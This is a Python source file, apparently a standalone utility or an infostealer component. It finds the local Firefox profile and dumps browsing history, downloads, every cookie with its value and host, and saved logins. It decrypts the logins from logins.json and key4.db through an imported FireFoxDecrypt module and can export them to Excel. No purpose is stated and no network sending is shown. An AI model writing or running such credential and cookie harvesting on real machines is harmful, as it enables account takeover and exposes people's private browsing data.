import shutil
import os
import sqlite3
from datetime import  datetime
import FireFoxDecrypt

class FirefoxBrowser:
    def __init__(self):
        
        self.is_installed = self.get_installed_browsers()
        self.home_path = os.getenv("APPDATA") + "\\Mozilla\\Firefox\\"
        
    def get_installed_browsers(self):
        try:
            default_dir_paths = ["C:\\Program Files\\Mozilla Firefox\\firefox.exe",
                                "C:\\Program Files (x86)\\\Mozilla Firefox\\firefox.exe"]
            for path in default_dir_paths:
                if os.path.exists(path):
                    return True
            return False
        except Exception as e:
            return e
    
    def firefox_date_and_time(self,timestamp):
        timestamp_s = timestamp / 1000000
        try:
            date_obj = datetime.fromtimestamp(timestamp_s)
        except TypeError:
            raise ValueError('Invalid Firefox timestamp')
        return date_obj.strftime('%Y-%m-%d %H:%M:%S')
               
    def get_path(self, file):
        try:
            if self.is_installed:
                appdata_path = os.getenv('APPDATA')
                profiles_path = os.path.join(
                    appdata_path, 'Mozilla\\Firefox\\Profiles\\')
                for filename in os.listdir(profiles_path):
                    profile_path = os.path.join(profiles_path, filename)
                    if os.path.isdir(profile_path):
                        logins_path = os.path.join(profile_path, file)
                        if os.path.isfile(logins_path):
                            return logins_path
                return None
            else:
                return "Firefox browser is not installed!!!!!"
        except Exception as e:
            return e
        
    def get_file_path(self, paths):
        try:
            for root, dirs, files in os.walk(self.home_path):
                for file in files:
                    if file==paths:
                        return os.path.join(root, file)
        except Exception as e:
            return e
        
    def firefox_history(self):
        history=""
        try:
            if self.is_installed:
                history_path = self.get_file_path("places.sqlite")
                if history_path:
                    
                    with sqlite3.connect(history_path) as conn:
                        c = conn.cursor()
                        c.execute("SELECT url, title,description, last_visit_date FROM moz_places ORDER BY last_visit_date desc")
                        results = c.fetchall()
                        for row in results:
                            datas = f"URLs : {row[0]}\n"
                            datas += f"Title : {row[1]}\n"
                            datas += f"Description : {row[2]}\n"
                            if row[3] is not None:
                                datas += f"Last visit date : {self.firefox_date_and_time(row[3])}\n\n"
                            else:
                                continue
                            history += datas
                   
                    return "*"*60+"\tFirefox history data\t"+"*"*60+"\n"+ history
                else:
                    return "Firefox browser is not installed!!!!!"
        except Exception as e:
            return e

    def get_password(self):
        try: 
            credrential = ""
            logins= self.get_file_path("logins.json")
            key4= self.get_file_path("key4.db")
            if logins and key4 :
                credrentials = FireFoxDecrypt.DecryptLogins(logins, key4)
                credrential += credrentials
                return credrential
            else:
                return None     
        except Exception as e:
            return e 
        
    def firefox_password_to_excel(self):
        try: 
            logins= self.get_file_path("logins.json")
            key4= self.get_file_path("key4.db")
            if logins and key4 :
                credrential = FireFoxDecrypt.DecryptLogins_exprt_to_excel(logins, key4)
            else:
                return None
            return credrential
        except Exception as e:
            return e 

    def get_firefox_downloads(self):
        try:
            downloads_path = self.get_file_path("places.sqlite")
            if downloads_path:

                with sqlite3.connect(downloads_path) as conn:
                    c = conn.cursor()
                    c.execute("SELECT moz_places.url, moz_places.title, moz_annos.content, moz_annos.dateAdded,moz_annos.lastModified FROM moz_annos, moz_places where moz_annos.place_id=moz_places.id order by moz_annos.dateAdded desc")
                    downloads = c.fetchall()
                    result =""
                    for download in downloads:
                        message = f"URLs : {download[0]}\n"
                        message += f"Title: {download[1]}\n"
                        if download[2].startswith("{"):
                            continue
                        else:
                            message += f"Target Path: {download[2]}\n"
                        
                        message += f"Start Time: {self.firefox_date_and_time(download[3])}\n"
                        message += f"Last Modification: {self.firefox_date_and_time(download[4])}\n\n"
                        result += message
                return result
        except Exception as e:
            return e
    
    def firefox_cookies(self):
        try:
            if self.is_installed:
                cookies = ""
                cookies_path = self.get_file_path("cookies.sqlite")
                if cookies_path:
                    with sqlite3.connect(cookies_path) as conn:
                        connect =conn.cursor()
                        connect.execute("SELECT name , value, host, expiry, lastAccessed, creationTime from moz_cookies")
                        rows =connect.fetchall()
                        for row in rows:
                            message = f"Cookies Name: {row[0]}\n"
                            message += f"Cookies Value: {row[1]}\n"
                            message += f"Cookies host: {row[2]}\n"
                            message += f"Expiration date: {datetime.fromtimestamp(row[3])}\n"
                            message += f"Last Accessed: {self.firefox_date_and_time(row[4])}\n"
                            message += f"Creation date: {self.firefox_date_and_time(row[5])}\n\n"
                            cookies += message
        
                     
                return cookies
        except Exception as e:
            return e
   
                
firefox = FirefoxBrowser()
# print(firefox.get_installed_browsers())
